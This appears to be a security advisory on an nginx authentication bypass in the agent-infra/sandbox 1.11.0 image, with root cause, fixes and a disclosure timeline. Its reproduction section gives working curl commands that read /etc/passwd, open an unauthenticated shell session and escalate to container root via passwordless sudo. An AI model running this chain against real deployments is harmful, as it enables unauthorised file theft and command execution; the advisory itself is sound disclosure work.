# agent-infra/sandbox 1.11.0 — nginx auth bypass (`?x=.json`) → unauthenticated file download → container-root RCE

**Severity:** Critical
**CVSS 3.1:** 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
<https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H>
**CWE:** CWE-288 (Authentication Bypass Using an Alternate Path or Channel), CWE-306 (Missing Authentication for Critical Function)

**Product:** `agent-infra/sandbox` container image — nginx gateway
**Vendor:** agent-infra (ByteDance) — <https://github.com/agent-infra/sandbox>
**Tested:** `ghcr.io/agent-infra/sandbox:1.11.0`, tag digest `sha256:6328d7fd2f0ff0b4c147c3d05b3df1ce331f4a482eb6e550ecd64ed1fcf906e7` (identical to `latest` at test time), image ID `sha256:c8c90673082b6d4bf6517bda004cbf8b6059fd17a0866d1971e17cce3da18ee9`.
**Upstream status:** HEAD `7f1afaf8d82bd30531a19caeb1a24dfebbc97d8c` re-checked 2026-11-26; all commits after v1.11.0 (`6bd4b52`) are docs-only; no fix released.
**Reproduction package:** <https://github.com/Teycir/agent-infra-sandbox-auth-bypass>
**Verified live (UTC):** 2026-11-26T12:47:09Z → 2026-11-26T12:47:29Z (fresh sweep; original discovery 2026-11-21T20:13Z)

---

## Summary

The sandbox gateway decides whether to require authentication by matching a `map` keyed on
`"$request_method:$request_uri"`. nginx's `$request_uri` includes the query string. A static-asset
allowlist regex anchored at the end of that string therefore matches any `GET` whose **query**
ends in `.json`, `.js`, `.css`, etc. Such requests are routed to `@proxy_without_auth`, which has
no `auth_request` directive. The backend (`aiod`) trusts the gateway and does not re-validate the
API key.

An unauthenticated network client can therefore:

1. download arbitrary backend-readable files via `/v1/file/download`,
2. create a shell session via `/v1/shell/terminal-url` and connect the WebSocket with no
   `Authorization` header (`101 Switching Protocols`),
3. run commands as `gem`, then `sudo -n id` → `uid=0(root)` (passwordless sudo), i.e. full
   container filesystem access as root.

`SANDBOX_API_KEY` provides no protection on this path. The bypass is GET-only; `POST` endpoints
(e.g. `/v1/shell/exec`) still return `401`.

## Root cause

Active config `/opt/gem/nginx-server-active.conf`
(sha256 `767145b6d19d4ce847400ac6ca4b6d9c7a5c8b3043133d1c1e4705600acaaf68`):

```nginx
map "$request_method:$request_uri" $target_workflow {
    default @proxy_with_auth;
    "GET:/v1/ping" @proxy_without_auth;
    "~*^GET:.+\.(js|css|svg|woff|json|ico|png|jpg|jpeg|gif|webp|wasm|ttf|woff2)$" @proxy_without_auth;
}
...
    location @proxy_with_auth {
        internal;
        auth_request /_auth_handler;
        ...
    }
    location @proxy_without_auth {
        internal;
        proxy_pass http://127.0.0.1:8081;
        ...
    }
    location / {
        try_files "" $target_workflow;
    }
```

- `$request_uri` = original URI **including `?args`**.
- The line-19 regex is anchored with `$`, so `/v1/file/download?path=/etc/passwd&x=.json`
  matches and selects `@proxy_without_auth`.
- `@proxy_without_auth` has no `auth_request`; `aiod` performs no independent authorization.
- `gem.sh:794-803` selects the auth template when `SANDBOX_API_KEY`/`JWT_PUBLIC_KEY` is set but
  only `envsubst`s ports; the key is never templated into nginx, so the bypass is independent of
  the key value.

## Reproduction

Prerequisites: Docker, network access to the container gateway. No credentials.

```bash
# 1. Start the vulnerable image with an API key configured (auth is nominally enabled)
docker run -d --name aio-test -e SANDBOX_API_KEY=testkey123 \
  -p 127.0.0.1:18080:8080 ghcr.io/agent-infra/sandbox:1.11.0

# 2. Control: protected endpoint without the bypass -> 401
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd'
# 401

# 3. Bypass: same request, query ending in .json -> 200 + file contents
curl -sS 'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd&x=.json'
# root:x:0:0:root:/root:/bin/bash ...

# 4. Suffix control: a different suffix still requires auth
curl -s -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd&x=.txt'
# 401

# 5. Unauthenticated shell session
curl -sS 'http://127.0.0.1:18080/v1/shell/terminal-url?x=.json'
# {"success":true,...,"data":"http://127.0.0.1:18080/terminal?session_id=<uuid>"}

# 6. WebSocket with NO Authorization header -> 101, then commands
python3 pocs/rce_ws.py http://127.0.0.1:18080
# uid=1000(gem) gid=1000(gem) groups=1000(gem)

# 7. Container root (passwordless sudo)
#    send over the same WS: sudo -n id; echo ROOTPROOF_$(sudo -n id -u)
# uid=0(root) gid=0(root) groups=0(root)
# ROOTPROOF_0
```

Full chain scripts: `pocs/poc.sh` and `pocs/rce_ws.py` in the reproduction repo.

## Verified results (2026-11-26T12:47Z, fresh re-run)

| Request | Auth | Status |
|---|---|---|
| `GET /v1/file/download?path=/etc/passwd` | none | 401 |
| `GET /v1/file/download?path=/etc/passwd&x=.json` | none | **200**, 1176 bytes |
| `GET /v1/file/download?path=/etc/passwd&x=.txt` | none | 401 |
| `GET /v1/shell/terminal-url?x=.json` | none | **200** + `session_id` |
| `WS /v1/shell/ws?session_id=…&x=.json` | none | **101** |
| `sudo -n id` over WS | none | **uid=0(root)** |

Downloaded `/etc/passwd` sha256:
`e55218f1d26777b820a75caaa0940fed64173affdef2fb96b51e20a9f4efd2ff`.

Evidence: `evidence/reverify-20261126/` (matrix, hashes, raw WS frames), plus the original
pinned-tag run in `evidence/pinned-1.11.0/`.

## Impact

Any unauthenticated client with network reachability to port 8080 can read files readable by the
sandbox backend (workspace contents, source, configuration, injected credentials) and execute
commands inside the container, escalating to root via passwordless `sudo`. This defeats the
sandbox's API-key boundary entirely. Impact is bounded by the container security boundary: the
demonstrated root is inside the sandbox container, not the Docker host. Host-level compromise,
mounted credentials, and cloud metadata access are deployment-dependent and were not verified.

## Fix

- Key the map on `$uri` (no query string), or strip/normalize the query before matching.
- Never route requests that carry a query string to the static-asset no-auth location.
- Re-validate the API key in `aiod` for every route, including internal ones.
- Require authentication for `/v1/shell/*`; remove passwordless `sudo` from `gem`.

## Disclosure

Vendor notified 2026-11-21T21:03:02Z via Proton Mail to best-effort maintainer addresses
(`songhaonan.773@bytedance.com`; Cc `chaolinjin@gmail.com`, `zhangjingtian.oana@bytedance.com` —
the last bounced 550). Upstream publishes no `SECURITY.md` and has no GitHub private reporting.
No reply as of 2026-11-26; no fix at HEAD `7f1afaf`. Disclosure timing is flexible and deferred
to the vendor/CNA.

AI disclosure: LLM-assisted analysis and drafting; the reporter executed and verified every PoC
step against the live image.
